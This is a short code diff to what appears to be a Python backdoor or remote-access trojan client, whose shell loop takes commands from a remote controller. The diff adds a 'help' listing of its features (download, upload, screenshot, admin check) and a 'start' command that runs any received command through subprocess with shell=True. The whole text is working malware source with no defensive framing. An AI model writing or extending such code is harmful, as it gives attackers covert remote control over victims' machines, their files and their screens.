@@ -61,6 +61,9 @@ def shell():
 		command = reliable_recv()
 		if command == 'q':
 			break
+		elif command[:] == "help":
+			help_options ="Command used download , upload , get, screenshot, start, check"  
+			relibale_send(help_options.encode('utf-8'))
 		elif command[:2] == "cd" and len(command) > 1:
 			try:
 				os.chdir(command[3:])
@@ -93,6 +96,12 @@ def shell():
 			except Exception as e:
 				print(e)
 				relibale_send("[!!] Failed to take screenshoot. ")
+		elif command[:5] == "start":
+			try:
+				subprocess.Popen(command[6:], shell=True)
+				relibale_send("Started ".encode('utf-8'))
+			except:
+				relibale_send("cannot start".encode('utf-8'))
 		elif command[:5] == "check":
 			try:
 				is_admin()
